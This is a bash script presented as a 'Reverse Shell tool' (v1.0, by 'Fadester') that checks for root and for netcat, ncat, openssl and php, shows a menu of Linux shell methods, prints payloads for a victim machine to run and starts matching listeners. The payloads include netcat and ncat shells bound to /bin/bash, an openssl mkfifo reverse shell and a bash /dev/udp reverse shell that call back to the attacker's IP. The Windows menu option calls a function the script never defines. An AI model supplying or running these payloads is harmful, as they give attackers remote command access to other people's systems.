#!/bin/bash
#coded by Fadester
#v1.0


#colors

green='\033[1;32m'
red='\e[1;91m'
yellow='\e[0m\e[1;93m'
lightgreen='\e[1;32m'
farblos='\e[0m'
BlueF='\e[1;34m'
cyan='\e[0;36m'
lightred='\e[101m'
blink='\e[5m'
magenta='\e[35m'
white='\e[1;37m'

dir=$(pwd)

trap ctrl_c INT  
ctrl_c() {
  echo
  echo -e "$BlueF[$red!$BlueF]$red Exit... $farblos"
  exit 1


}


dependencies() {
#checking Dependencies
echo ""
echo -e "$BlueF[$yellow*$BlueF]$yellow Checking Dependencies... $farblos"
sleep 0.5
echo
user=$USER
printf "\e[1;34m[\e[0m\e[1;93m*\e[1;34m]\e[0m\e[1;93m User:$farblos"
if [[ $user == "root" ]]; then
  sleep 0.3
  echo -e "$green root $farblos"
  sleep 0.3
else
  echo -e "$red $user $farblos"
  echo -e "$BlueF[$red!$BlueF]$red You need to be root to run this script $farblos"
  exit 1
fi
sleep 0.2
printf "\e[1;34m[\e[0m\e[1;93m*\e[1;34m]\e[0m\e[1;93m Netcat$farblos"
command -v nc > /dev/null 2>&1
if [[ $? == 0 ]]; then
  sleep 0.2
  echo -e "$green OK! $farblos"
  sleep 0.2
else
  echo -e "$red FAIL! $farblos"
  sleep 0.2
  echo -e "$red You need Netcat to use this script! $farblos"
  exit 1
fi
sleep 0.1
printf "\e[1;34m[\e[0m\e[1;93m*\e[1;34m]\e[0m\e[1;93m Ncat$farblos"
command -v ncat > /dev/null 2>&1
if [[ $? == 0 ]]; then
  sleep 0.2
  echo -e "$green OK! $farblos"
  sleep 0.2
else
  echo -e "$red FAIL! $farblos"
  sleep 0.2
  echo -e "$red You need Ncat to use this script! $farblos"
  exit 1
fi
sleep 0.1
printf "\e[1;34m[\e[0m\e[1;93m*\e[1;34m]\e[0m\e[1;93m openssl$farblos"
command -v openssl > /dev/null 2>&1
if [[ $? == 0 ]]; then
  sleep 0.2
  echo -e "$green OK! $farblos"
  sleep 0.2
else
  echo -e "$red FAIL! $farblos"
  sleep 0.2
  echo -e "$red You need openssl to use this script! $farblos"
  exit 1
fi
sleep 0.1
printf "\e[1;34m[\e[0m\e[1;93m*\e[1;34m]\e[0m\e[1;93m php$farblos"
command -v php > /dev/null 2>&1
if [[ $? == 0 ]]; then
  sleep 0.2
  echo -e "$green OK! $farblos"
  sleep 0.2
else
  echo -e "$red FAIL! $farblos"
  sleep 0.2
  echo -e "$red You need php to use this script! $farblos"
  exit 1
fi
}
banner() {
echo
echo -e "$red ▪      .▄▄ · ▄▄▄ .▄▄▄ .     ▄· ▄▌      ▄• ▄▌  $farblos "
echo -e "$red ██     ▐█ ▀. ▀▄.▀·▀▄.▀·    ▐█▪██▌▪     █▪██▌  $farblos "
echo -e "$red ▐█·    ▄▀▀▀█▄▐▀▀▪▄▐▀▀▪▄    ▐█▌▐█▪ ▄█▀▄ █▌▐█▌  $farblos "
echo -e "$red ▐█▌    ▐█▄▪▐█▐█▄▄▌▐█▄▄▌     ▐█▀·.▐█▌.▐▌▐█▄█▌  $farblos "
echo -e "$red ▀▀▀     ▀▀▀▀  ▀▀▀  ▀▀▀       ▀ •  ▀█▄▀▪ ▀▀▀   $farblos "
echo
printf "\033[1;32m         _______________          \e[35m|*\_/*|\033[1;32m________   \n"
printf "\033[1;32m        |  ___________  |        |\e[35m|_/-\_|\033[1;32m______  |  \n"
printf "\033[1;32m        | |           | |        | |           | |  \n"
printf "\033[1;32m        | |   0   0   | |        | |   0   0   | |  \n"
printf "\033[1;32m        | |     -     | |        | |     -     | |  \n"
printf "\033[1;32m        | |   \___/   | |        | |   \___/   | |  \n"
printf "\033[1;32m        | |___     ___| |        | |___________| |  \n"
printf "\033[1;32m        |_____|\e[1;34m\_/\033[1;32m|_____|        |_______________|  \n"
printf "\033[1;32m          _|__|\e[1;34m/ \ \033[1;32m|_|_............._|________|_    \n"
printf "\033[1;32m         / ********** \            / ********** \   \n"
printf "\033[1;32m       /  ************  \        /  ************  \   \n"
printf "\033[1;32m      --------------------      --------------------  \n"
echo
echo -e "      $BlueF[$red::$BlueF]    $yellow++$green--$BlueF[$red Reverse Shell tool $BlueF]$green--$yellow++    $BlueF[$red::$BlueF]$farblos"
echo -e "      $BlueF[$red::$BlueF]    $yellow++$green--$BlueF[$red coded by Fadester  $BlueF]$green--$yellow++    $BlueF[$red::$BlueF]$farblos"
echo -e "      $BlueF[$red::$BlueF]    $yellow++$green--$BlueF[$red        v1.0        $BlueF]$green--$yellow++    $BlueF[$red::$BlueF]$farblos"
}
eingabe() {
#save IP in variable
ip4=$(hostname -I | cut -d " " -f1)
echo
echo -e "$BlueF[$green""1$BlueF]$yellow Linux $farblos"
echo -e "$BlueF[$green""2$BlueF]$yellow Windows $farblos"
echo
read -p $'\e[1;34m[\e[35mChoice\e[1;34m]\e[1;34m >> \e[1;37m' eingabe
if [[ $eingabe == 1 ]]; then
  shell_linux
elif [[ $eingabe == 2 ]]; then
  shell_windows
else
  echo -e "$BlueF[$red!$BlueF]$red Invalid option! $farblos"
fi

}
#choose linux attack method
shell_linux() {
echo
echo -e "$BlueF[$green""1$BlueF]$yellow Netcat $farblos"
echo -e "$BlueF[$green""2$BlueF]$yellow Ncat $farblos"
echo -e "$BlueF[$green""3$BlueF]$yellow OpenSSL $farblos"
echo -e "$BlueF[$green""4$BlueF]$yellow Bash UDP $farblos"
echo
read -p $'\e[1;34m[\e[35mChoice\e[1;34m]\e[1;34m >> \e[1;37m' eingabe1
if [[ $eingabe1 == "1" ]]; then
  shell_manually
elif [[ $eingabe1 == 2 ]]; then
  shell_ncat
elif [[ $eingabe1 == 3 ]]; then
  openssl_shell
elif [[ $eingabe1 == 4 ]]; then
  bashUDP_shell
else
  echo -e "$BlueF[$red!$BlueF]$red Invalid option! $farblos"
fi

}
shell_manually() {
echo
echo -e "$BlueF[$yellow*$BlueF]$green Attacking System:$magenta Linux $farblos"
read -p $'\e[1;34m[\033[1;32m+\e[1;34m]\033]\033[1;32m Target IP address:\e[1;37m ' target_ip
echo -e "$BlueF[$red!$BlueF]$yellow Execute code: nc -l -p 6996 -e /bin/bash $farblos"
sleep 0.5
echo -e "$BlueF[$green*$BlueF]$green Starting listener... $farblos"
sleep 0.5
while [[ true ]]; do
  nc -v $target_ip 6996
  sleep 1
done

}


shell_ncat() {
echo
echo -e "$BlueF[$yellow*$BlueF]$green Attacking System:$magenta Linux $farblos"
echo -e "$BlueF[$red!$BlueF]$yellow Execute code: ncat 0.0.0.0 4242 --ssl -e /bin/bash -v $farblos"
sleep 0.5
echo -e "$BlueF[$green*$BlueF]$green Starting listener on port 4242... $farblos"
ncat -l 4242 --ssl -v
}

openssl_shell() {

echo -e "$BlueF[$yellow*$BlueF]$green Attacking System:$magenta Linux $farblos"
echo -e "$BlueF[$green+$BlueF]$green Starting listener on port 4242.... $farblos"
echo -e "$BlueF[$red!$BlueF]$yellow Execute code: mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $ip4:4242 > /tmp/s; rm /tmp/s" $farblos
ncat --ssl -v -l -p 4242


}

bashUDP_shell() {


echo -e "$BlueF[$yellow*$BlueF]$green Attacking System:$magenta Linux $farblos"
echo -e "$BlueF[$green+$BlueF]$green Starting listener on port 4242.... $farblos"
echo -e "$BlueF[$red!$BlueF]$yellow Execute code: sh -i >& /dev/udp/$ip4/4242 0>&1" $farblos
nc -u -lvp 4242 -s $ip4 
}

shell_eingabe() {
  while [[ true ]]; do
    echo -e "$BlueF[$green::$BlueF]$green Command: $farblos"
  done
}

banner
dependencies
clear
banner
eingabe
